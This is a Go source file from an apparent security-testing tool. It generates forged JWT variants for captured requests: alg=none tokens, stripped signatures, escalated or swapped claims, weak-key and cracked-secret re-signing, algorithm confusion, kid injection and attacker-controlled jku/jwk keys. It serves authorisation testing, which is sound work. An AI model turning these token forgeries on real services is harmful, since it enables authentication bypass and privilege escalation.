package mutate

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"net/http"
	"sort"
	"strings"

	jwthelper "github.com/bugsyhewitt/possession/internal/jwt"
	"github.com/bugsyhewitt/possession/internal/model"
)

// JWT mutators (D24). Each scans the baseline for JWT-shaped tokens via
// internal/jwt.Detect and emits variants that splice a mutated token
// back into the same location. When no JWT is found the mutator emits
// the empty slice — silently, by design (a request without a JWT is not
// a JWT bug surface).
//
// All four are registered after the P2 mutators in DefaultRegistry. The
// order is: jwt-alg-none, jwt-sig-strip, jwt-claim-tamper,
// jwt-resign-weak-key. D11's per-mutator iteration order (rank, name on
// identities, etc.) is preserved.

// replaceToken returns a clone of req with the token at loc replaced by
// newToken. Header replacements preserve "Bearer " prefix when present;
// cookie replacements rewrite the named cookie; body replacements
// rewrite the top-level JSON field in-place via re-marshal. Returns nil
// on any failure — caller should treat nil as "skip this variant".
func replaceToken(req *model.CapturedRequest, loc jwthelper.TokenLocation, newToken string) *model.CapturedRequest {
	if req == nil {
		return nil
	}
	out := CloneRequest(req)
	switch loc.Where {
	case "header":
		old := out.Headers.Get(loc.Key)
		if old == "" {
			return nil
		}
		if loc.Key == "Authorization" || hasBearerPrefix(old) {
			out.Headers.Set(loc.Key, "Bearer "+newToken)
		} else {
			out.Headers.Set(loc.Key, newToken)
		}
	case "cookie":
		for _, c := range out.Cookies {
			if c != nil && c.Name == loc.Key {
				c.Value = newToken
			}
		}
	case "body":
		// Body fields are JSON; rewrite via simple string replace of the
		// raw token bytes. This avoids round-tripping JSON (which would
		// re-order keys and break diff-based assertions). Safe because
		// the token includes only base64url+dots, which can't appear
		// inside a JSON string by accident at the same length.
		if len(out.Body) == 0 || loc.Raw == "" {
			return nil
		}
		out.Body = byteReplaceAll(out.Body, []byte(loc.Raw), []byte(newToken))
	default:
		return nil
	}
	return out
}

func hasBearerPrefix(s string) bool {
	return len(s) >= 7 && (s[:7] == "Bearer " || s[:7] == "bearer ")
}

func byteReplaceAll(s, old, new []byte) []byte {
	if len(old) == 0 {
		return s
	}
	// Single-allocation replace.
	var out []byte
	for {
		i := indexBytes(s, old)
		if i < 0 {
			out = append(out, s...)
			return out
		}
		out = append(out, s[:i]...)
		out = append(out, new...)
		s = s[i+len(old):]
	}
}

func indexBytes(haystack, needle []byte) int {
	if len(needle) == 0 {
		return 0
	}
	if len(needle) > len(haystack) {
		return -1
	}
	for i := 0; i+len(needle) <= len(haystack); i++ {
		match := true
		for j := 0; j < len(needle); j++ {
			if haystack[i+j] != needle[j] {
				match = false
				break
			}
		}
		if match {
			return i
		}
	}
	return -1
}

// makeJWTVariant constructs a Variant for a JWT mutation. detail is
// merged with location metadata so the JSON output records exactly what
// was changed and where.
func makeJWTVariant(req *model.CapturedRequest, loc jwthelper.TokenLocation, mutatorType, desc, class string, detail map[string]string) model.Variant {
	d := map[string]string{
		"jwt_where": loc.Where,
		"jwt_key":   loc.Key,
	}
	for k, v := range detail {
		d[k] = v
	}
	return model.Variant{
		Base: req,
		Mutation: model.Mutation{
			Type:        mutatorType,
			Description: desc,
			Detail:      d,
			Class:       class,
		},
	}
}

// ─── jwt-alg-none ─────────────────────────────────────────────────────

// JWTAlgNone emits 3 variants per token location: alg="none"/"None"/
// "NONE", signature dropped. Tests whether the verifier rejects the
// "unsigned token" attack.
type JWTAlgNone struct{}

func (JWTAlgNone) Name() string { return "jwt-alg-none" }

func (JWTAlgNone) Generate(base *model.CapturedRequest, _ *model.RoleMatrix) []model.Variant {
	locs := jwthelper.Detect(base)
	if len(locs) == 0 {
		return nil
	}
	out := make([]model.Variant, 0, len(locs)*3)
	for _, loc := range locs {
		for _, alg := range []string{"none", "None", "NONE"} {
			hdr := copyHeader(loc.Header)
			hdr["alg"] = alg
			tok, err := jwthelper.Encode(hdr, loc.Claims, "")
			if err != nil {
				continue
			}
			req := replaceToken(base, loc, tok)
			if req == nil {
				continue
			}
			out = append(out, makeJWTVariant(req, loc, "jwt-alg-none",
				"set alg="+alg+" and drop signature",
				"authn-bypass",
				map[string]string{"alg": alg}))
		}
	}
	return out
}

// ─── jwt-sig-strip ────────────────────────────────────────────────────

// JWTSigStrip keeps header+claims as-is but empties the signature
// segment. Tests whether the verifier requires a signature at all.
type JWTSigStrip struct{}

func (JWTSigStrip) Name() string { return "jwt-sig-strip" }

func (JWTSigStrip) Generate(base *model.CapturedRequest, _ *model.RoleMatrix) []model.Variant {
	locs := jwthelper.Detect(base)
	if len(locs) == 0 {
		return nil
	}
	out := make([]model.Variant, 0, len(locs))
	for _, loc := range locs {
		tok, err := jwthelper.Encode(loc.Header, loc.Claims, "")
		if err != nil {
			continue
		}
		req := replaceToken(base, loc, tok)
		if req == nil {
			continue
		}
		out = append(out, makeJWTVariant(req, loc, "jwt-sig-strip",
			"strip signature segment", "authn-bypass", nil))
	}
	return out
}

// ─── jwt-claim-tamper ─────────────────────────────────────────────────

// JWTClaimTamper rewrites one high-value claim at a time. For each
// matching claim it emits a variant: privesc claims (role/admin/scope/
// groups) get escalated values from JWTEscalatedValues; identity claims
// (sub/uid/user/email) get swapped to another matrix identity's value
// from Identity.Markers. Class is set per-variant from
// JWTClaimClassByName (D30: class is fixed at generation time, not
// re-derived in the evaluator).
type JWTClaimTamper struct{}

func (JWTClaimTamper) Name() string { return "jwt-claim-tamper" }

func (JWTClaimTamper) Generate(base *model.CapturedRequest, m *model.RoleMatrix) []model.Variant {
	locs := jwthelper.Detect(base)
	if len(locs) == 0 {
		return nil
	}
	out := make([]model.Variant, 0)
	for _, loc := range locs {
		if loc.Claims == nil {
			continue
		}
		// Stable claim iteration order for deterministic output.
		claimNames := make([]string, 0, len(loc.Claims))
		for k := range loc.Claims {
			claimNames = append(claimNames, k)
		}
		sort.Strings(claimNames)
		for _, claim := range claimNames {
			class, watched := JWTClaimClassByName[claim]
			if !watched {
				continue
			}
			oldVal := loc.Claims[claim]
			// Privilege escalation: substitute escalated value.
			if escalated, ok := JWTEscalatedValues[claim]; ok {
				newClaims := copyClaims(loc.Claims)
				newClaims[claim] = escalated
				tok, err := jwthelper.Encode(loc.Header, newClaims, "invalid-signature")
				if err != nil {
					continue
				}
				req := replaceToken(base, loc, tok)
				if req == nil {
					continue
				}
				out = append(out, makeJWTVariant(req, loc, "jwt-claim-tamper",
					fmt.Sprintf("escalate %s claim", claim), class,
					map[string]string{
						"claim": claim,
						"old":   fmt.Sprintf("%v", oldVal),
						"new":   fmt.Sprintf("%v", escalated),
					}))
				continue
			}
			// Identity spoofing: swap to ANOTHER matrix identity's marker.
			if m == nil {
				continue
			}
			for _, ident := range sortIdentities(m.Identities) {
				for _, marker := range ident.Markers {
					if marker == "" || fmt.Sprintf("%v", oldVal) == marker {
						continue
					}
					newClaims := copyClaims(loc.Claims)
					newClaims[claim] = marker
					tok, err := jwthelper.Encode(loc.Header, newClaims, "invalid-signature")
					if err != nil {
						continue
					}
					req := replaceToken(base, loc, tok)
					if req == nil {
						continue
					}
					out = append(out, makeJWTVariant(req, loc, "jwt-claim-tamper",
						fmt.Sprintf("swap %s to %s", claim, ident.Name), class,
						map[string]string{
							"claim":      claim,
							"old":        fmt.Sprintf("%v", oldVal),
							"new":        marker,
							"swapped_to": ident.Name,
						}))
				}
			}
		}
	}
	return out
}

// ─── jwt-resign-weak-key ──────────────────────────────────────────────

// JWTResignWeakKey re-signs the original token with HS256 using each
// secret in WeakHMACSecrets. Catches "the secret never got rotated"
// and "we used the default" classes of bug.
type JWTResignWeakKey struct{}

func (JWTResignWeakKey) Name() string { return "jwt-resign-weak-key" }

func (JWTResignWeakKey) Generate(base *model.CapturedRequest, _ *model.RoleMatrix) []model.Variant {
	locs := jwthelper.Detect(base)
	if len(locs) == 0 {
		return nil
	}
	out := make([]model.Variant, 0, len(locs)*len(WeakHMACSecrets))
	for _, loc := range locs {
		hdr := copyHeader(loc.Header)
		hdr["alg"] = "HS256"
		for _, secret := range WeakHMACSecrets {
			tok, err := jwthelper.EncodeWithHS256(hdr, loc.Claims, secret)
			if err != nil {
				continue
			}
			req := replaceToken(base, loc, tok)
			if req == nil {
				continue
			}
			out = append(out, makeJWTVariant(req, loc, "jwt-resign-weak-key",
				fmt.Sprintf("re-sign with weak HMAC secret %q", secret),
				"authn-bypass",
				map[string]string{"weak_secret": secret}))
		}
	}
	return out
}

// ─── jwt-alg-confusion ────────────────────────────────────────────────

// JWTAlgConfusion implements the RS256/ES256→HS256 algorithm confusion
// attack: re-sign the token using the server's public key as the HMAC
// secret. Requires matrix.Target.JWT.PublicKeyPEM; skips with a note
// when absent.
type JWTAlgConfusion struct{}

func (JWTAlgConfusion) Name() string { return "jwt-alg-confusion" }

func (JWTAlgConfusion) Generate(base *model.CapturedRequest, m *model.RoleMatrix) []model.Variant {
	locs := jwthelper.Detect(base)
	if len(locs) == 0 {
		return nil
	}
	if m == nil || m.Target.JWT == nil || m.Target.JWT.PublicKeyPEM == "" {
		return nil // requires public_key_pem; skip silently (caller notes via plan)
	}
	out := make([]model.Variant, 0, len(locs))
	for _, loc := range locs {
		tok, err := jwthelper.AlgConfusionFromPEM(loc.Header, loc.Claims, m.Target.JWT.PublicKeyPEM)
		if err != nil {
			continue
		}
		req := replaceToken(base, loc, tok)
		if req == nil {
			continue
		}
		out = append(out, makeJWTVariant(req, loc, "jwt-alg-confusion",
			"re-sign RS256/ES256 token with public key as HMAC secret",
			"authn-bypass",
			map[string]string{"attack": "alg-confusion"}))
	}
	return out
}

// ─── jwt-kid-injection ────────────────────────────────────────────────

// JWTKidInjection manipulates the `kid` header to inject path-traversal
// and SQL-injection payloads. Emits one variant per payload class.
type JWTKidInjection struct{}

func (JWTKidInjection) Name() string { return "jwt-kid-injection" }

func (JWTKidInjection) Generate(base *model.CapturedRequest, _ *model.RoleMatrix) []model.Variant {
	locs := jwthelper.Detect(base)
	if len(locs) == 0 {
		return nil
	}
	out := make([]model.Variant, 0)
	for _, loc := range locs {
		for _, payload := range KidInjectionPayloads {
			hdr := copyHeader(loc.Header)
			hdr["kid"] = payload.Value
			tok, err := jwthelper.Encode(hdr, loc.Claims, "")
			if err != nil {
				continue
			}
			req := replaceToken(base, loc, tok)
			if req == nil {
				continue
			}
			out = append(out, makeJWTVariant(req, loc, "jwt-kid-injection",
				fmt.Sprintf("inject kid payload: %s", payload.Class),
				"authn-bypass",
				map[string]string{
					"kid_class":   payload.Class,
					"kid_payload": payload.Value,
				}))
		}
	}
	return out
}

// ─── jwt-jwks-spoof ───────────────────────────────────────────────────

// JWTJwksSpoof embeds an attacker-controlled key in the JWT header — via
// inline `jwk` or `jku` (URL) — and signs the token with the matching
// private key. Tests whether the server trusts header-supplied keys.
type JWTJwksSpoof struct{}

func (JWTJwksSpoof) Name() string { return "jwt-jwks-spoof" }

func (JWTJwksSpoof) Generate(base *model.CapturedRequest, _ *model.RoleMatrix) []model.Variant {
	locs := jwthelper.Detect(base)
	if len(locs) == 0 {
		return nil
	}
	// Generate an ephemeral attacker RSA key pair once per call.
	privKey, pubKey, err := jwthelper.GenerateAttackerKeyPair()
	if err != nil {
		return nil
	}
	attackerKID := "attacker-key-1"
	jwkMap := jwthelper.PublicKeyToJWK(pubKey, attackerKID)

	out := make([]model.Variant, 0, len(locs)*2)
	for _, loc := range locs {
		// Variant 1: inline jwk header.
		hdrJWK := copyHeader(loc.Header)
		hdrJWK["alg"] = "RS256"
		hdrJWK["kid"] = attackerKID
		hdrJWK["jwk"] = jwkMap
		delete(hdrJWK, "jku")
		tokJWK, err := jwthelper.EncodeWithRS256(hdrJWK, loc.Claims, privKey)
		if err == nil {
			if req := replaceToken(base, loc, tokJWK); req != nil {
				out = append(out, makeJWTVariant(req, loc, "jwt-jwks-spoof",
					"embed attacker JWK inline in header",
					"authn-bypass",
					map[string]string{"spoof_type": "inline-jwk"}))
			}
		}

		// Variant 2: jku pointing to an attacker-controlled URL (placeholder).
		hdrJKU := copyHeader(loc.Header)
		hdrJKU["alg"] = "RS256"
		hdrJKU["kid"] = attackerKID
		hdrJKU["jku"] = JWKSAttackerURL
		delete(hdrJKU, "jwk")
		tokJKU, err := jwthelper.EncodeWithRS256(hdrJKU, loc.Claims, privKey)
		if err == nil {
			if req := replaceToken(base, loc, tokJKU); req != nil {
				out = append(out, makeJWTVariant(req, loc, "jwt-jwks-spoof",
					"set jku to attacker-controlled URL",
					"authn-bypass",
					map[string]string{
						"spoof_type":    "jku-redirect",
						"attacker_jku":  JWKSAttackerURL,
					}))
			}
		}
	}
	return out
}

// ─── jwt-hmac-crack ───────────────────────────────────────────────────

// JWTHmacCrack attempts to recover an HS256 secret from the wordlist.
// On a hit, re-signs a tampered token (admin role escalation) with the
// cracked secret. Cap: at most HmacCrackMaxAttempts per token location.
type JWTHmacCrack struct {
	// Wordlist overrides the default when non-nil (primarily for tests).
	Wordlist []string
}

func (JWTHmacCrack) Name() string { return "jwt-hmac-crack" }

func (j JWTHmacCrack) Generate(base *model.CapturedRequest, _ *model.RoleMatrix) []model.Variant {
	locs := jwthelper.Detect(base)
	if len(locs) == 0 {
		return nil
	}
	wordlist := j.Wordlist
	if wordlist == nil {
		wordlist = HmacCrackWordlist
	}
	out := make([]model.Variant, 0)
	for _, loc := range locs {
		// Only crack HS256 tokens (RS256 etc. can't be cracked this way).
		alg, _ := loc.Header["alg"].(string)
		if !strings.EqualFold(alg, "HS256") {
			continue
		}
		parts := strings.SplitN(loc.Raw, ".", 3)
		if len(parts) != 3 {
			continue
		}
		encodedHeaderClaims := parts[0] + "." + parts[1]
		attempts := 0
		for _, secret := range wordlist {
			if attempts >= HmacCrackMaxAttempts {
				break
			}
			attempts++
			h := hmac.New(sha256.New, []byte(secret))
			h.Write([]byte(encodedHeaderClaims))
			expectedSig := jwthelper.B64URL(h.Sum(nil))
			if expectedSig != parts[2] {
				continue
			}
			// Secret found — emit a tampered token re-signed with it.
			tamperedClaims := copyClaims(loc.Claims)
			if tamperedClaims == nil {
				tamperedClaims = map[string]any{}
			}
			tamperedClaims["role"] = "admin"
			tok, err := jwthelper.EncodeWithHS256(copyHeader(loc.Header), tamperedClaims, secret)
			if err != nil {
				break
			}
			req := replaceToken(base, loc, tok)
			if req == nil {
				break
			}
			out = append(out, makeJWTVariant(req, loc, "jwt-hmac-crack",
				fmt.Sprintf("cracked HS256 secret %q, re-signed with role=admin", secret),
				"privesc",
				map[string]string{
					"cracked_secret": secret,
					"tampered_claim": "role=admin",
				}))
			break // one cracked variant per location
		}
	}
	return out
}

// jwkToJSON is used to embed the attacker JWK map as a JSON value in the header.
// golang-jwt serialises map[string]any as a nested JSON object; we want the same.
var _ = json.Marshal // ensure import is used

// ─── helpers ──────────────────────────────────────────────────────────

func copyHeader(h map[string]any) map[string]any {
	out := make(map[string]any, len(h))
	for k, v := range h {
		out[k] = v
	}
	return out
}

func copyClaims(c map[string]any) map[string]any {
	out := make(map[string]any, len(c))
	for k, v := range c {
		out[k] = v
	}
	return out
}

// Silence unused-import linter when a build with -tags excludes a path.
var _ = http.MethodGet
